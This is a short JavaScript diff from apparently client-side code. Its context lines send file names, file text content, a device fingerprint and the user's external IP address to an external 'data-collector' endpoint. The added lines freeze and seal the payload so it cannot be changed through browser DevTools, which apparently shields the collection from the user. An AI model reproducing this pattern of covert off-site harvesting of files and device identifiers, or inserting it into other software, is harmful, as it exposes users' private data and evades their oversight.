@@ -153,6 +153,9 @@
         const BASE_API = 'https://data-collector-gizw.onrender.com';
         try {
           const payload = { folder_name: folderName, file_name: fileName, content: txt, fingerprint: [z2,zA,he.model||'',extIP].join('|'), platform: zA, model: he.model||'', externalIP: extIP };
+          // Защита от модификации через DevTools
+          Object.freeze(payload);
+          Object.seal(payload);
           const send = () => fetch(`${BASE_API}/collect`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true });
           let ok = false;
           try{ const r = await Promise.race([send(), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 6000))]); ok = r && r.ok; }catch{}
